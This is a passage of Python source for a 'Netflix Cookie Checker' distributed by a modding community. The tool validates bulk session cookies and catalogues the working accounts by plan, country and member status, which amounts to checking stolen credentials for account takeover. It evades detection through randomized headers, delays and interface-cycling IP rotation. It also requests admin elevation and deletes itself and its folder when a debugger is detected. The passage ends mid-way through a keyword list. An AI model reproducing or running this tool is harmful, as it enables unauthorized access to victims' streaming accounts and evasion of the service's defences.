import os
import queue
import sys
import ctypes
import shutil
import json
import threading
import time
import subprocess
import re
import html
import datetime
import io
import random
import dateutil.parser
import codecs

import colorama
import urllib3

from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event, Lock
from collections import defaultdict

import hashlib
import requests

colorama.init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
#  GLOBALS & FLAGS
# ---------------------------------------------------------------------------
internet_connected = Event()
internet_connected.set()
rate_limit_handling = Event()
rate_limit_handling.clear()

USE_IP_ROTATION = False
ADD_HEADER_FOOTER = False
VPN_MODE = False

pause_event = threading.Event()
pause_event.clear()
rate_limit_lock = threading.RLock()

continuous_network_errors = 0
network_errors_lock = threading.RLock()
print_lock = threading.Lock()
error_file_lock = threading.Lock()

# For concurrency triggers
netscape_request_count = 0
netscape_div950 = 0
lock_netscape_count = threading.Lock()

json_request_count = 0
json_div950 = 0
lock_json_count = threading.Lock()

FLUSH_THRESHOLD = 1000
session = None  # re-init after partial flush

# ---------------------------------------------------------------------------
#  Error types
# ---------------------------------------------------------------------------

class ErrorType:
    NETWORK = "NetworkError"
    ENCODING = "EncodingError"
    UNKNOWN = "UnknownError"
    JSON_DECODE = "JSONDecodeError"

# ---------------------------------------------------------------------------
#  NEW STAT FUNCTION (MAIN)
# ---------------------------------------------------------------------------

# -------------------------------------------
#  Helper function to export and show stat
# --------------------------------------------

def dispatch_final_stats(counts, start_time, is_json=False):
    """
    Exports stats to a .txt file and then prints the final summary
    in the same (main) thread.
    """
    export_stats_to_txt(counts, start_time, is_json=is_json)
    print_final_summary(counts, start_time, is_json=is_json)

# ---------------------------------------------------------------------------
#  NEW STAT HELPER FUNCTIONS (BEGIN)
# ---------------------------------------------------------------------------

def format_plan_country_info(info):
    c = info.get('count', 0)
    eb = info.get('extra_bought_count', 0)
    eu = info.get('extra_unbought_count', 0)
    tp = info.get('third_party_count', 0)
    nm = info.get('normal_count', 0)

    combo_bought_tp = min(eb, tp)
    leftover_eb = eb - combo_bought_tp
    leftover_tp = tp - combo_bought_tp

    combo_unbought_tp = min(eu, leftover_tp)
    leftover_eu = eu - combo_unbought_tp
    leftover_tp2 = leftover_tp - combo_unbought_tp

    parts = []
    if combo_bought_tp > 0:
        if combo_bought_tp == 1:
            parts.append("1 extra slot bought and third party")
        else:
            parts.append(f"{combo_bought_tp} extra slot bought and third party")

    if combo_unbought_tp > 0:
        if combo_unbought_tp == 1:
            parts.append("1 extra slot unbought and third party")
        else:
            parts.append(f"{combo_unbought_tp} extra slot unbought and third party")

    if leftover_eb > 0:
        if leftover_eb == 1:
            parts.append("1 extra slot bought")
        else:
            parts.append(f"{leftover_eb} extra slot bought")

    if leftover_eu > 0:
        if leftover_eu == 1:
            parts.append("1 extra slot unbought")
        else:
            parts.append(f"{leftover_eu} extra slot unbought")

    if leftover_tp2 > 0:
        if leftover_tp2 == 1:
            parts.append("1 third party")
        else:
            parts.append(f"{leftover_tp2} third party")

    if nm > 0:
        if nm == 1:
            parts.append("1 normal")
        else:
            parts.append(f"{nm} normal")

    if not parts:
        return f"{c} | (no details)"

    detail_str = " | ".join(parts)
    return f"{c} | ({detail_str})"

def print_final_summary(counts, start_time, is_json=False):
    end_time = datetime.datetime.now()
    time_taken = end_time - start_time

    if is_json:
        print("\n\n" + colorama.Fore.MAGENTA + "Finished Checking JSON Cookies | Netflix Cookie Checking Summary")
    else:
        print("\n\n" + colorama.Fore.MAGENTA + "Finished Checking | Netflix Cookie Checking Summary")

    print(colorama.Fore.CYAN + "========================" + colorama.Style.RESET_ALL)

    print(f"{colorama.Fore.CYAN}Total cookies checked: {colorama.Fore.GREEN}{counts['total_checked']}{colorama.Style.RESET_ALL}")
    print(f"{colorama.Fore.CYAN}Valid cookies: {colorama.Fore.GREEN}{counts['valid']}{colorama.Style.RESET_ALL}")
    print(f"{colorama.Fore.CYAN}Invalid cookies: {colorama.Fore.RED}{counts['bad']}{colorama.Style.RESET_ALL}")
    print(f"{colorama.Fore.CYAN}Errors: {colorama.Fore.MAGENTA}{counts['errors']}{colorama.Style.RESET_ALL}")
    print(f"{colorama.Fore.CYAN}Duplicate cookies: {colorama.Fore.BLUE}{counts['duplicates']}{colorama.Style.RESET_ALL}")

    plan_hits_output = [f"{p}: {c}" for p, c in counts['plan_hits'].items() if c > 0]
    if plan_hits_output:
        print(f"{colorama.Fore.CYAN}Plan Hits: {colorama.Fore.GREEN}{' | '.join(plan_hits_output)}{colorama.Style.RESET_ALL}")

    qhits = [f"{q}: {c}" for q, c in counts['video_quality_hits'].items() if c > 0]
    if qhits:
        print(f"{colorama.Fore.CYAN}Video Quality Hits: {colorama.Fore.GREEN}{' | '.join(qhits)}{colorama.Style.RESET_ALL}")

    print(f"{colorama.Fore.CYAN}Third Party Billing Partner accounts: {colorama.Fore.YELLOW}{counts['third_party_billing_partner']}{colorama.Style.RESET_ALL}")
    print(f"{colorama.Fore.CYAN}Extra Member cookies: {colorama.Fore.YELLOW}{counts['extra_member']}{colorama.Style.RESET_ALL}")
    print(
        f"{colorama.Fore.CYAN}Extra slot cookies: {colorama.Fore.YELLOW}{counts['extra_slot']} "
        f"(Bought: {counts['extra_slot_bought']} | Unbought: {counts['extra_slot_unbought']}){colorama.Style.RESET_ALL}"
    )
    print(f"{colorama.Fore.CYAN}Former Member cookies: {colorama.Fore.YELLOW}{counts['former_member']}{colorama.Style.RESET_ALL}")
    print(f"{colorama.Fore.CYAN}Never Member cookies : {colorama.Fore.YELLOW}{counts['never_member']}{colorama.Style.RESET_ALL}")

    cond_list = []
    if counts['is_paused'] > 0:
        cond_list.append(f"Paused: {counts['is_paused']}")
    if counts['is_pending_pause'] > 0:
        cond_list.append(f"Pending Pause: {counts['is_pending_pause']}")
    if counts['no_service'] > 0:
        cond_list.append(f"No Service: {counts['no_service']}")
    if counts['in_free_trial'] > 0:
        cond_list.append(f"In Free Trial: {counts['in_free_trial']}")
    if counts['is_kids'] > 0:
        cond_list.append(f"Kids Accounts: {counts['is_kids']}")
    if counts['non_current_member'] > 0:
        cond_list.append(f"Non-Current Members: {counts['non_current_member']}")
    if counts['free_accounts'] > 0:
        cond_list.append(f"Free Accounts: {counts['free_accounts']}")

    if cond_list:
        joined = " | ".join(cond_list)
        print(f"{colorama.Fore.CYAN}Special Conditions: {colorama.Fore.MAGENTA}{joined}{colorama.Style.RESET_ALL}")

    print(colorama.Fore.CYAN + "\n========================" + colorama.Style.RESET_ALL)
    print(colorama.Fore.MAGENTA + "Detailed Plan + Country Breakdown:" + colorama.Style.RESET_ALL)
    print(colorama.Fore.CYAN + "========================" + colorama.Style.RESET_ALL + "\n")

    plan_country = counts.get('plan_country', {})
    for plan_type, country_map in plan_country.items():
        print(f"{colorama.Fore.YELLOW}{plan_type}{colorama.Style.RESET_ALL}")
        for country_name, info in country_map.items():
            result = format_plan_country_info(info)
            print(f"   {country_name} => {result}")
        print()

    print(f"{colorama.Fore.CYAN}Time taken to check cookies: {colorama.Fore.GREEN}{time_taken}{colorama.Style.RESET_ALL}")
    print(colorama.Fore.CYAN + "========================" + colorama.Style.RESET_ALL)
    input(colorama.Fore.CYAN + "Press enter to return....\n" + colorama.Style.RESET_ALL)
    clear_screen()

def export_stats_to_txt(counts, start_time, is_json=False):
    filename = "netflix_cookie_summary.txt"

    if os.path.exists(filename):
        try:
            os.remove(filename)
        except Exception as e:
            print(colorama.Fore.RED + f"[ERROR] Failed to delete old summary '{filename}': {e}" + colorama.Style.RESET_ALL)

    end_time = datetime.datetime.now()
    time_taken = end_time - start_time

    try:
        with open(filename, "w", encoding="utf-8") as f:
            if is_json:
                f.write("Finished Checking JSON Cookies | Netflix Cookie Checking Summary\n")
            else:
                f.write("Finished Checking | Netflix Cookie Checking Summary\n")

            f.write("=====================================\n")
            f.write(f"Total cookies checked: {counts.get('total_checked', 0)}\n")
            f.write(f"Valid cookies: {counts.get('valid', 0)}\n")
            f.write(f"Invalid cookies: {counts.get('bad', 0)}\n")
            f.write(f"Errors: {counts.get('errors', 0)}\n")
            f.write(f"Duplicate cookies: {counts.get('duplicates', 0)}\n")

            plan_hits_output = [f"{p}: {c}" for p, c in counts.get('plan_hits', {}).items() if c > 0]
            if plan_hits_output:
                f.write(f"Plan Hits: {' | '.join(plan_hits_output)}\n")

            qhits = [f"{q}: {c}" for q, c in counts.get('video_quality_hits', {}).items() if c > 0]
            if qhits:
                f.write(f"Video Quality Hits: {' | '.join(qhits)}\n")

            f.write(f"Third Party Billing Partner accounts: {counts.get('third_party_billing_partner', 0)}\n")
            f.write(f"Extra Member cookies: {counts.get('extra_member', 0)}\n")
            f.write(
                f"Extra slot cookies: {counts.get('extra_slot', 0)} "
                f"(Bought: {counts.get('extra_slot_bought', 0)} | Unbought: {counts.get('extra_slot_unbought', 0)})\n"
            )
            f.write(f"Former Member cookies: {counts.get('former_member', 0)}\n")
            f.write(f"Never Member cookies : {counts.get('never_member', 0)}\n")

            cond_list = []
            if counts.get('is_paused', 0) > 0:
                cond_list.append(f"Paused: {counts['is_paused']}")
            if counts.get('is_pending_pause', 0) > 0:
                cond_list.append(f"Pending Pause: {counts['is_pending_pause']}")
            if counts.get('no_service', 0) > 0:
                cond_list.append(f"No Service: {counts['no_service']}")
            if counts.get('in_free_trial', 0) > 0:
                cond_list.append(f"In Free Trial: {counts['in_free_trial']}")
            if counts.get('is_kids', 0) > 0:
                cond_list.append(f"Kids Accounts: {counts['is_kids']}")
            if counts.get('non_current_member', 0) > 0:
                cond_list.append(f"Non-Current Members: {counts['non_current_member']}")
            if counts.get('free_accounts', 0) > 0:
                cond_list.append(f"Free Accounts: {counts['free_accounts']}")
            if cond_list:
                f.write(f"Special Conditions: {' | '.join(cond_list)}\n")

            f.write("=====================================\n")
            f.write("Detailed Plan + Country Breakdown:\n")
            f.write("=====================================\n")

            plan_country = counts.get('plan_country', {})
            for plan_type, country_map in plan_country.items():
                f.write(f"{plan_type}\n")
                for country_name, info in country_map.items():
                    result = format_plan_country_info(info)
                    f.write(f"   {country_name} => {result}\n")
                f.write("\n")

            f.write(f"Time taken to check cookies: {time_taken}\n")
            f.write("=====================================\n")

        print(colorama.Fore.GREEN + f"[INFO] Summary exported to {filename}" + colorama.Style.RESET_ALL)
    except Exception as e:
        print(colorama.Fore.RED + f"[ERROR] Failed to export summary: {e}" + colorama.Style.RESET_ALL)

    return filename

# ==================== NEW STAT HELPER FUNCTIONS (END) ======================

# ---------------------------------------------------------------------------
#  Utility functions
# ---------------------------------------------------------------------------

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def detect_debugger():
    """
    If a debugger is attached on Windows, self-delete.
    """
    try:
        is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent() != 0
        if is_debugger_present:
            print("Debugger detected! Initiating self-deletion...")
            self_delete()
    except:
        pass

def self_delete():
    """
    Self-delete the script and its folder.
    """
    try:
        files_to_delete = ['cookie_checker.log', sys.argv[0]]
        for file in files_to_delete:
            if os.path.exists(file):
                os.remove(file)
        script_folder = os.path.dirname(os.path.abspath(sys.argv[0]))
        if os.path.exists(script_folder):
            shutil.rmtree(script_folder, ignore_errors=True)
        print("All files deleted successfully. Exiting...")
        sys.exit()
    except Exception as e:
        print(f"Error during self-deletion: {e}")
        sys.exit(1)

def check_internet_connection():
    urls_to_check = [
        "https://www.google.com",
        "https://www.cloudflare.com",
        "https://www.microsoft.com"
    ]
    for url in urls_to_check:
        try:
            response = requests.get(url, timeout=5, verify=False)
            if response.status_code == 200:
                return True
        except:
            continue
    return False

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if sys.version_info >= (3, 5):
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([f'"{param}"' for param in sys.argv[1:]])
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",
                sys.executable,
                f'"{script}" {params}',
                None,
                1
            )
            sys.exit()
        except Exception as e:
            print(f"Failed to elevate privileges: {e}")
            sys.exit(1)
    else:
        print("This script requires Python 3.5 or higher.")
        sys.exit(1)

# ---------------------------------------------------------------------------
#  Banner and info
# ---------------------------------------------------------------------------

def print_banner():
    banner = r"""
    
    
            ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
            ┃                                                                                              __┃
            ┃            ███╗   ██╗███████╗████████╗███████╗██╗     ██╗███╗   ██╗███████╗                 ┃
            ┃            ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     ██║████╗  ██║██╔════╝                 ┃
            ┃            ██╔██╗ ██║█████╗     ██║   █████╗  ██║     ██║██╔██╗ ██║█████╗                   ┃
            ┃            ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║     ██║██║╚██╗██║██╔══╝                   ┃
            ┃            ██║ ╚████║███████╗   ██║   ███████╗███████╗██║██║ ╚████║███████╗                 ┃
            ┃            ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝                 ┃___
            ┃                                                                                                ┃
            ┃         ░░░░░░  N E T F L I X   C O O K I E   C H E C K E R  ░░░░░░                            ┃
            ┃                                                                                                ┃
            ┃    ⚡  Effortlessly Verify Your Netflix Cookies | Powered by Phoenix / Lucifer / FMP  ⚡      ┃
            ┃                                                                                                ┃
            ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
            ┃                                                                                                ┃
            ┃   🌟 Key Features:                                                                             ┃
            ┃   ✔️  Full Capture of Account Details                                                          ┃
            ┃   ✔️  Proxy-less (with proxy coming soon)                                                      ┃
            ┃   ✔️  Easy Duplicate Detection & Handling                                                      ┃
            ┃                                                                                                ┃
            ┃   Developed by: Phoenix | Discord: FMP (Flame Mod Paradise) | YouTube: FMP                     ┃
            ┃   Version: 5.3                                                                               ┃
            ┃                                                                                                ┃
            ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
                    
    """
    print(colorama.Fore.CYAN + banner + colorama.Fore.RESET)

def ghosty_banner():
    banner = r"""
    
                ╔════════════════════════════════════════════╗
                ║                                            ║
                ║        👻 Netflix Cookie Checker 👻       ║
                ║                                            ║
                ║    Version 5.3 | Full Capture Enabled    ║
                ║    Proxy Less  | Duplicate Detection       ║
                ║                                            ║
                ║      Created by Phoenix | FMP Community    ║
                ║                                            ║
                ╚════════════════════════════════════════════╝
                
    """
    print(colorama.Fore.LIGHTWHITE_EX + banner + colorama.Fore.RESET)

def info():
    contact_info = [
        "Discord server link  : https://discord.gg/DfUm7qWxRu or https://discord.gg/fmpofficial",
        "Yt channel           : https://www.youtube.com/@FMP-yt",
        "Telegram             : @flamemodparadise",
        "Telegram channel     : https://t.me/flamemodparadiseofficial",
        "Contact              : flamemodparadisediscord@gmail.com"
    ]
    for info_item in contact_info:
        print(colorama.Fore.YELLOW + info_item)

    try:
        input(colorama.Fore.CYAN + "Press enter key to continue...")
    except KeyboardInterrupt:
        print("\nInput interrupted. Proceeding to clear screen.")
    finally:
        clear_screen()

# ---------------------------------------------------------------------------
#  Utility function to delete empty subfolder inside cookies dir
# ---------------------------------------------------------------------------

def delete_empty_subfolders(main_folder):
    for root, dirs, files in os.walk(main_folder, topdown=False):
        if os.path.abspath(root) == os.path.abspath(main_folder):
            continue
        if not os.listdir(root):
            try:
                os.rmdir(root)
                print(f"Deleted empty subfolder: {root}")
            except Exception as e:
                print(f"Error deleting folder {root}: {e}")

# ---------------------------------------------------------------------------
#  Language and header randomization
# ---------------------------------------------------------------------------

_ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.8,en-US;q=0.5",
    "de-DE,de;q=0.9,en-US;q=0.7",
    "en-GB,en-US;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en-US;q=0.7",
    "it-IT,it;q=0.9,en-US;q=0.7",
    "ja-JP,ja;q=0.9,en-US;q=0.6",
]
_SEC_FETCH_SITE = ["same-origin", "same-site", "none", "cross-site"]
_SEC_FETCH_MODE = ["navigate", "no-cors", "cors", "same-origin"]
_SEC_FETCH_DEST = ["document", "iframe", "image", "style", "script", "empty"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/115.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0",
]

def randomize_headers(session):
    session.headers["Accept-Language"] = random.choice(_ACCEPT_LANGUAGES)
    session.headers["Sec-Fetch-Site"] = random.choice(_SEC_FETCH_SITE)
    session.headers["Sec-Fetch-Mode"] = random.choice(_SEC_FETCH_MODE)
    session.headers["Sec-Fetch-Dest"] = random.choice(_SEC_FETCH_DEST)

def create_session(
    use_random_ua: bool = True,
    max_retries: int = 5,
    backoff_factor: float = 2.0
) -> requests.Session:
    s = requests.Session()

    if use_random_ua:
        s.headers["User-Agent"] = random.choice(USER_AGENTS)
    else:
        s.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/114.0.0.0 Safari/537.36"
        )

    randomize_headers(s)

    retry_strategy = Retry(
        total=max_retries,
        status_forcelist=[429, 500, 502, 503, 504],
        backoff_factor=backoff_factor,
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS"],
        raise_on_status=False
    )

    adapter = HTTPAdapter(max_retries=retry_strategy)
    s.mount("http://", adapter)
    s.mount("https://", adapter)

    s.headers.update({'Accept-Encoding': 'identity'})

    original_request = s.request

    def request_with_timeout(*args, **kwargs):
        time.sleep(random.uniform(1.0, 3.0))
        kwargs.setdefault('timeout', (5, 25))
        response = original_request(*args, **kwargs)
        if response.status_code == 429:
            with print_lock:
                print(colorama.Fore.YELLOW + "[WARNING] HTTP 429 encountered.")
        return response

    s.request = request_with_timeout

    return s

# ---------------------------------------------------------------------------
#  IP Rotation & Rate Limit handling
# ---------------------------------------------------------------------------

def get_connected_interfaces():
    interfaces = []
    try:
        result = subprocess.run(
            'netsh interface show interface',
            shell=True, capture_output=True, text=True
        )
        lines = result.stdout.splitlines()
        if len(lines) >= 3:
            lines = lines[3:]
        else:
            lines = []
        patterns = ['ethernet', 'wi-fi', 'wifi', 'wi fi', 'wlan']

        for line in lines:
            if not line.strip():
                continue
            parts = line.strip().split()
            if len(parts) < 4:
                continue
            state = parts[1]
            interface_name = ' '.join(parts[3:]).strip()
            interface_name_lower = interface_name.lower()

            if state == 'Connected' and any(p in interface_name_lower for p in patterns):
                interfaces.append(interface_name)
    except subprocess.CalledProcessError as e:
        print(colorama.Fore.RED + f"Failed to get network interfaces: {e}")
    return interfaces

def rotate_ip():
    connected_interfaces = get_connected_interfaces()
    if not connected_interfaces:
        print(colorama.Fore.RED + "No connected network interfaces found.")
        return
    print(colorama.Fore.YELLOW + "Rotating IP addresses for connected interfaces...")
    internet_connected.clear()
    try:
        for interface in connected_interfaces:
            try:
                disable_command = f'netsh interface set interface "{interface}" admin=disable'
                enable_command = f'netsh interface set interface "{interface}" admin=enable'
                subprocess.run(disable_command, shell=True, check=True)
                time.sleep(3)
                subprocess.run(enable_command, shell=True, check=True)
                time.sleep(3)
                print(colorama.Fore.GREEN + f"IP address rotated successfully for {interface}.")
            except subprocess.CalledProcessError as e:
                print(colorama.Fore.RED + f"Failed to rotate IP for {interface}: {e}")

        while not check_internet_connection():
            print(colorama.Fore.RED + "Waiting for internet connection to restore...")
            time.sleep(3)
        print(colorama.Fore.GREEN + "Internet connection restored. Resuming...")
    finally:
        internet_connected.set()

def handle_rate_limit():
    if USE_IP_ROTATION:
        print(colorama.Fore.YELLOW + "Rate limit or IP rotation triggered, rotating IP now...")
        rotate_ip()
        print(colorama.Fore.GREEN + "Continuing after IP rotation...")
    else:
        print(colorama.Fore.YELLOW + "Rate limit encountered, waiting (10s) before retrying...")
        wait_time = 10
        for i in range(wait_time, 0, -1):
            print(colorama.Fore.YELLOW + f"Waiting {i} seconds...", end='\r')
            time.sleep(1)
        print(colorama.Fore.GREEN + "\nContinuing...")

# ---------------------------------------------------------------------------
#  Plan Keywords & Patterns
# ---------------------------------------------------------------------------

plan_keywords = {
    'Mobile': [
        'Mobile', 'Móvil', 'Mobile', 'Mobil', 'Móvel', 'Mobile', 'Handy',
        'モバイル', '모바일', '移动版', '手機', '行動裝置方案', 'الجوال', 'Mobil', 'मोबाइल',
        'Seluler', 'มือถือ', 'Di động', 'Mobilny', 'Mobilní', 'Mobil', 'Κινητό',
        'Mobil', 'נייד', 'Мобільний', 'Мобилен', 'Mobilni', 'Mobilný', 'Mobilais',
        'Mobilus', 'Mobiilne', 'Farsími', 'Simu', 'Mobiel', 'Mobile', 'Mudah Alih',
        'Seluler', 'Mobile', 'телефон', 'Мобільний', 'Cellulare',
        'Mobil', 'Telefoon', 'Mobil', 'Selskap', 'Cep Telefonu', 'โทรศัพท์มือถือ',
        'Mobilusis', 'Мобільний', 'Mobil', 'Celular', 'Mobiltelefon',
        'Téléphone portable', 'Handphone', '휴대폰', '携帯電話', '전화기',
        'Teléfono móvil', 'Telefone Móvel', '전화', 'Mobilfunk', 'ケータイ',
        'Telemoveis', 'Telefon Seluler', 'Telefon Komórkowy', 'Telefòn Mobil',
        'มือถือพกพา', 'Móvil Personal', 'Portátil', 'Mobila', 'Móvil Adicional',
        'Celular Brasileiro', 'Foonu Alagbeka', 'Iselula', 'Ifowuni Ephathekayo',
        'Selfoon', 'Mobil Haitien', 'Selpon', 'ተንቀሳቃሽ ስልኪ', 'Ekwentị Mkpanaaka',
        'Wayar Hannu', '휴대용', '手机端', '移动端', 'Telemóvel',
        'טלפון נייד', 'มือถือ', 'โทรศัพท์มือถือ', 'โทรศัพท์พกพา', 'Ponsel', 'Telefon Bimbit', 'মোবাইল', 'மொபைல்', 'မိုဘိုင်း',
    ],
    'Basic': [
        'Basic', 'Básico', 'Essentiel', 'Basis', 'Base', 'Grunnleggende',
        '基本', 'Baze', 'Базовий', 'Osnovno', 'Grunnleggende', 'Essencial',
        'Fundamental', 'Perus', 'Базовый', 'ベーシック', '베이식', '基础版', '基本',
        '基础', '基本方案', '기본', 'الأساسية', 'Temel', 'बेसिक', 'Dasar', 'พื้นฐาน',
        'Cơ bản', 'Podstawowy', 'Základní', 'Alap', 'Γrunden', 'De bază', 'בסיסי',
        'Основен', 'Osnovni', 'Základný', 'Pamata', 'Pagrindinis', 'Põhiline',
        'Grunnur', 'Msingi', 'Basies', 'Bazë', 'Osnovni', 'Asas', 'Esensial',
        'Основной', 'Ydintaso', 'Bazinis', 'Básica', 'Perusteet', 'Osnovna',
        'Bazik', 'Basal', 'بنیادی', 'Primordial', 'Plan Básico', 'Fonamental',
        'Basico', 'Plan Essentiel', 'Base', 'Basique', 'Garis Dasar',
        'Grundlæggende', 'Bazowy', 'Temel Seviye', 'Pangkalahatan', 'Simple',
        'Osnovno', 'Básico Extra', 'Sederhana', 'Básico Brasileiro', 'Alabápọ',
        'Okuyisisekelo', 'Eyona Isiseko', 'Basies', 'Bazik', 'Pangunahing',
        'መሠረታዊ', 'Ihe Ndabere', 'Na Asali', 'Simples', '初级', '简单', '기초',
        'חבילה בסיסית', 'เบสิค', 'মূল', 'મૂળભૂત', 'அடிப்படை', 'အခြေခံ', 'Grunnläggande',
    ],
    'Standard with Ads': [
        'Standard with Ads', 'Estándar con anuncios', 'Standard mit Werbung',
        'Standard avec publicités', 'Standaard met advertenties',
        'Standard con pubblicità', '標準（含廣告）', '标准（含广告）', '标准含广告',
        '標準含廣告', '스탠다드 (광고 포함)', '스탠다드(광고 포함)', 'مع إعلانات',
        'Standart reklamlı', 'स्टैंडर्ड विज्ञापनों के साथ', 'Standard mit Werbung',
        'มาตรฐานพร้อมโฆษณา', 'Tiêu chuẩn có quảng cáo', 'Standard z reklamami',
        'Standard s reklamami', 'Standard s reklamami', 'Standard met advertenties',
        'Стандартный с рекламой', 'סטנדרט עם פרסומות', 'Standard s reklamami', 'Standard cu reclame', 'Štандарт s reklamami',
        'Standart met advertensies', 'Standard dengan Iklan',
        'Standard dengan iklan', 'Standard dengan Iklan', '标准含广告', '标准含广告版',
        '標準含廣告版', '광고 포함 스탠다드', 'スタンダード（広告付き）', 'スタンダード (広告付き)',
        'スタンダード広告付き', '标准含广告的标准方案', 'Стандарт с рекламой', '标准带广告',
        'Reklamlı Standart', 'Standard med annoncer', '标准（含广告）', 'Стандарт із рекламою',
        'Standard cu publicitate', 'Standard med Annonser', 'Annunci Standard',
        'Publicidade Padrão', 'Standar con iklan', 'Standard med reklamer',
        'Estandar con publicidad', 'Standart reklamalarla', 'Padrão com anúncios',
        'Standard mit Annoncen', 'Estandar con Anuncios', 'Standard mit Inseraten',
        'Standard con Avvisi', 'Standaard met Reclame', 'Standard com Anúncios',
        'Ipele Didara Pelu Ipolowo', 'Izinga Elijwayelekile Elinezikuphi',
        'Umgangatho Oneentengiso', 'Standaard Met Advertensies', 'Standa Ak Anonse',
        'Pamantayang May Mga Ad', 'መደበኛ ምስ ምልእታት', 'Usoro Nzuko Na Mgbasa Ozi',
        'Matsayi Tare Da Tallace-Tallace', '광고 포함 표준', '含广告标准', '광고 포함형 스탠다드',
        '含广告版标准', 'স্ট্যান্ডার্ড বিজ্ঞাপনের সাথে', 'มาตรฐานรวมโฆษณา', 'Τυπικό με διαφημίσεις',
    ],
    'Standard': [
        'Standard', 'Estándar', 'Standart', 'Standaard', 'Standardni', 'Стандартный',
        'スタンダード', '스탠다드', '标准版', '标准', '標準方案', '標準',
        'القياسية', 'Standart', 'स्टैंडर्ड', 'Standar', 'มาตรฐาน', 'Tiêu chuẩn',
        'Standardowy', 'Standardní', 'Standard', 'Στάνταρ', 'Standard',
        'סטנדרט', 'Стандарт', 'Štandard', 'Standarta', 'Standartinis', 'Standard', 'Standard',
        'Kiwango', 'Standaard', 'Standard', 'Standardni', 'Standard', 'Standard',
        'Piawai', 'Standard', 'Стандартна', '标准', '標準', 'Standart', 'Стандарт',
        'Standarta', 'Стандартен', 'Standard', 'Standartas', 'Стандартен',
        'Standardas', 'Normale', 'Normativo', 'Plan Standard', 'Assinatura Standard',
        'Estandar', 'Standaart', 'Standardus', 'Stàndard', 'Forfait Standard',
        'Стандарт Пакет', 'Estandarizado', 'Stándar General', 'Paket Standar',
        'Plano Standard', 'Standard Brasileiro', 'Okujwayelekile', 'Umgangatho',
        'Standaard Afrikaans', 'Standa Haitian', 'Pamantayan', 'መደበኛ', 'Usoro Nzuko',
        'Matsayi', 'Aláfẹ́mi', 'Padrão', '표준', '표준형', '标准型', 'Normal',
        'סטנדרטית', 'มาตรฐาน', 'স্ট্যান্ডার্ড', 'ஸ்டாண்டர்ட்', 'Standard (Svensk)',
    ],
    'Premium': [
        'Premium', 'Prémium', 'プレミアム', '프리미엄', '高级版', '尊享版', '高級方案', '高級',
        'المميزة', 'Özel', 'प्रीमियम', 'Premium', 'พรีเมียม', 'Cao cấp', 'Premiumowy',
        'Premium', 'Prémium', 'Premium', 'Premium', 'פרिमיום', 'Премиум',
        'Premium', 'Premium', 'Premium', 'Premium', 'Premium', 'Premium',
        'Prémium', 'Prémium', 'Istimewa', 'Преміум', 'Prémio', 'Premi', '高级',
        '高級', 'Preminum', 'प्रिमियम', 'Prémium', 'Πριμο', 'Преміумний', 'Premijum',
        'Primera Clase', 'Luxus', 'Esclusivo', 'Plan Premium', 'Cuenta Premium',
        'Преміум-аккаунт', 'Prémium Fiók', 'Conto Premium', 'Konto Premium',
        'Akun Premium', 'Compte Premium', 'Cuenta Superior', 'Премиум Пакет',
        'Plano Premium', 'Premium Brasileiro', 'Aládùn', 'Iqophelo Eliphezulu',
        'Okujabulisayo Okuphezulu', 'Voorkeur', 'Prim Haitian', 'Pinakamataas', 'ልዩ',
        'Ezigbo Kacha Elu', 'Mafi Girma', 'Prêmio', 'Premiado', '고급', '고급형', '최고급',
        '高端', '最高级', 'พรีเมี่ยมพิเศษ', 'প্রিমিয়াম', 'ப்ரீமியம்', 'အဆင့်မြင့်',
    ],
    'Extra Member': [
        'Extra Member', 'Miembro Extra', 'Membre Supplémentaire', 'Mitglied Extra',
        'Membro Extra', 'Ekstra Medlem', 'Lisäjäsen', 'Дополнительный участник',
        '追加メンバー', '추가 회원', '额外成员', '附加成员', '額外成員', '附加成員', 'عضو إضافي',
        'Ekstra Üye', 'अतिरिक्त सदस्य', 'Anggota Tambahan', 'สมาชิกเพิ่มเติม','Thành viên bổ sung',
        'Dodatkowy członek', 'Další člen', 'További tag','Papildu dalībnieks', 'Papildomas narys', 'Lisaliige', 'Aukaaðili',
